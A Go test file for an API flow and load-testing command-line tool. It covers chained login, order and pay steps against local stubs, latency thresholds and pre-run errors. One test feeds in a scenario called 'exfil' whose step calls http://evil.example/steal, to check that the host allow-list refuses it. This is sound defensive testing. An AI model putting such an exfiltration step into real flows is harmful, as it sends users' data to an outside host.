package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const checkoutFlow = `flow: checkout
data: users.csv
steps:
  - id: login
    call: POST /auth/login
    body: { email: "{{ user.email }}", password: "{{ user.password }}" }
    extract: { token: $.data.access_token }
    assert: [ status == 200, token != null ]
  - id: create_order
    call: POST /orders
    headers: { Authorization: "Bearer {{ token }}" }
    extract: { order_id: $.data.id }
  - id: pay
    call: POST /orders/{{ order_id }}/pay
    headers: { Authorization: "Bearer {{ token }}" }
    assert: [ status == 202 ]
`

const usersCSV = "email,password\nada@example.test,pw1\ngrace@example.test,pw2\n"

// checkoutStub serves the chained flow; payStatus lets a test force the pay
// step to fail.
func checkoutStub(t *testing.T, payStatus int) *httptest.Server {
	t.Helper()
	const token = "tok-abc"
	mux := http.NewServeMux()
	mux.HandleFunc("POST /auth/login", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"data":{"access_token":"` + token + `"}}`))
	})
	mux.HandleFunc("POST /orders", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer "+token {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		w.Write([]byte(`{"data":{"id":"ord-1"}}`))
	})
	mux.HandleFunc("POST /orders/{id}/pay", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(payStatus)
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv
}

// writeScenario lays a scenario, its fixture, and a target file into a temp
// dir and returns the scenario and target paths.
func writeScenario(t *testing.T, flowYAML, baseURL string) (scenario, targetPath string) {
	t.Helper()
	dir := t.TempDir()
	scenario = filepath.Join(dir, "checkout.flow.yaml")
	targetPath = filepath.Join(dir, "stub.yaml")
	write := func(path, content string) {
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatalf("write %s: %v", path, err)
		}
	}
	write(scenario, flowYAML)
	write(filepath.Join(dir, "users.csv"), usersCSV)
	write(targetPath, fmt.Sprintf("name: teststub\nbase_urls:\n  - %s\n", baseURL))
	return scenario, targetPath
}

func TestRunChainedFlowPasses(t *testing.T) {
	srv := checkoutStub(t, http.StatusAccepted)
	scenario, targetPath := writeScenario(t, checkoutFlow, srv.URL)

	var stdout, stderr strings.Builder
	code := run(&stdout, &stderr, []string{"run", scenario, "--target", targetPath, "--store", t.TempDir()})
	if code != 0 {
		t.Fatalf("exit = %d, want 0\nstdout:\n%s\nstderr:\n%s", code, stdout.String(), stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "2 iteration(s): 2 passed, 0 failed") {
		t.Errorf("summary missing from output:\n%s", out)
	}
}

func TestRunFailingAssertionExitsNonzero(t *testing.T) {
	srv := checkoutStub(t, http.StatusInternalServerError) // pay returns 500, not 202
	scenario, targetPath := writeScenario(t, checkoutFlow, srv.URL)

	var stdout, stderr strings.Builder
	code := run(&stdout, &stderr, []string{"run", scenario, "--target", targetPath, "--store", t.TempDir()})
	if code != 1 {
		t.Fatalf("exit = %d, want 1 (a failing assertion)\nstdout:\n%s", code, stdout.String())
	}
	if !strings.Contains(stdout.String(), "pay") {
		t.Errorf("output should name the failing step:\n%s", stdout.String())
	}
}

// slowStub answers every request after a fixed delay, to drive latency
// thresholds.
func slowStub(t *testing.T, delay time.Duration) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(delay)
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(srv.Close)
	return srv
}

const loadFlow = `flow: slowpoke
steps:
  - id: hit
    call: GET /slow
profile:
  mode: load
  vus: 4
  hold: 300ms
  thresholds:
    - p95(latency) < 20ms
`

// TestRunLoadThresholdBreachExitsNonzero is the issue #17 acceptance: a load run
// whose p95 exceeds the threshold exits nonzero and names the breach.
func TestRunLoadThresholdBreachExitsNonzero(t *testing.T) {
	srv := slowStub(t, 60*time.Millisecond) // p95 ~60ms, threshold is 20ms
	scenario, targetPath := writeScenario(t, loadFlow, srv.URL)

	var stdout, stderr strings.Builder
	code := run(&stdout, &stderr, []string{"run", scenario, "--target", targetPath, "--store", t.TempDir()})
	if code != 1 {
		t.Fatalf("exit = %d, want 1 (p95 breach)\nstdout:\n%s", code, stdout.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "p95(latency) < 20ms") || !strings.Contains(out, "BREACH") {
		t.Errorf("output should name the breached threshold:\n%s", out)
	}
}

func TestRunLoadThresholdPassExitsZero(t *testing.T) {
	srv := slowStub(t, 2*time.Millisecond)
	loose := strings.Replace(loadFlow, "p95(latency) < 20ms", "p95(latency) < 500ms", 1)
	scenario, targetPath := writeScenario(t, loose, srv.URL)

	var stdout, stderr strings.Builder
	code := run(&stdout, &stderr, []string{"run", scenario, "--target", targetPath, "--store", t.TempDir()})
	if code != 0 {
		t.Fatalf("exit = %d, want 0 (threshold met)\nstdout:\n%s\nstderr:\n%s", code, stdout.String(), stderr.String())
	}
}

func TestRunMissingScenarioIsPreRunError(t *testing.T) {
	var stdout, stderr strings.Builder
	code := run(&stdout, &stderr, []string{"run", "/no/such/scenario.yaml", "--target", "local"})
	if code != 2 {
		t.Fatalf("exit = %d, want 2 (pre-run error)", code)
	}
}

func TestRunExternalHostRefusedIsPreRunError(t *testing.T) {
	srv := checkoutStub(t, http.StatusAccepted)
	external := "flow: exfil\nsteps:\n  - id: leak\n    call: GET http://evil.example/steal\n"
	scenario, targetPath := writeScenario(t, external, srv.URL)

	var stdout, stderr strings.Builder
	code := run(&stdout, &stderr, []string{"run", scenario, "--target", targetPath})
	if code != 2 {
		t.Fatalf("exit = %d, want 2 (host allow-list refusal)\nstderr:\n%s", code, stderr.String())
	}
	if !strings.Contains(stderr.String(), "evil.example") {
		t.Errorf("stderr should name the refused host:\n%s", stderr.String())
	}
}
